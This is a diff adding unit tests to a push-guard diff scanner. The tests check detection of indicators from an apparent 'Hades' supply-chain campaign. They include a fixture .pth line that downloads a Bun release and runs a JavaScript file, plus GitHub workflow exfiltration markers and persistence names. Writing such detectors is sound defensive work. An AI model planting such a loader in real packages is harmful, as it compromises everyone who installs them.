@@ -194,6 +194,60 @@ class PushGuardTests(unittest.TestCase):
 
         self.assertEqual([], findings)
 
+    def test_scan_diff_blocks_hades_pypi_pth_bun_loader(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/package/example-setup.pth b/package/example-setup.pth",
+                "index 1111111..2222222 100644",
+                "--- a/package/example-setup.pth",
+                "+++ b/package/example-setup.pth",
+                "@@ -1,0 +1,1 @@",
+                "+import urllib.request, tempfile, subprocess; urllib.request.urlretrieve('https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip', tempfile.gettempdir() + '/b.zip'); subprocess.run(['bun', 'run', '_index.js'])",  # push-guard: ignore
+            ]
+        )
+
+        findings = _scan_diff(diff_text)
+        rule_ids = {finding.rule_id for finding in findings}
+
+        self.assertIn("workflow.hades_pypi_pth_loader", rule_ids)
+        self.assertIn("workflow.hades_pypi_bun_download", rule_ids)
+
+    def test_scan_diff_blocks_hades_github_exfil_markers_in_workflow(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/.github/workflows/codeql.yml b/.github/workflows/codeql.yml",
+                "index 1111111..2222222 100644",
+                "--- a/.github/workflows/codeql.yml",
+                "+++ b/.github/workflows/codeql.yml",
+                "@@ -1,0 +1,3 @@",
+                "+name: Run Copilot",  # push-guard: ignore
+                "+artifact: format-results",  # push-guard: ignore
+                "+path: results/results-123.json",  # push-guard: ignore
+            ]
+        )
+
+        findings = _scan_diff(diff_text)
+        rule_ids = {finding.rule_id for finding in findings}
+
+        self.assertIn("workflow.hades_github_exfil_marker", rule_ids)
+
+    def test_scan_diff_does_not_block_markdown_hades_notes(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/docs/hades.md b/docs/hades.md",
+                "index 1111111..2222222 100644",
+                "--- a/docs/hades.md",
+                "+++ b/docs/hades.md",
+                "@@ -1,0 +1,4 @@",
+                "+Watch for oven-sh/bun/releases/download and bun-v1.3.13.",  # push-guard: ignore
+                "+Watch for Hades - The End for the Damned.",  # push-guard: ignore
+                "+Watch for Run Copilot and format-results.",  # push-guard: ignore
+                "+Watch for gh-token-monitor persistence.",  # push-guard: ignore
+            ]
+        )
+
+        self.assertEqual([], _scan_diff(diff_text))
+
     def test_ignore_marker_suppresses_secret_and_workflow_rules(self):
         # A line carrying the explicit opt-out marker is skipped by every rule,
         # even when it contains a real token shape and an IOC pattern.
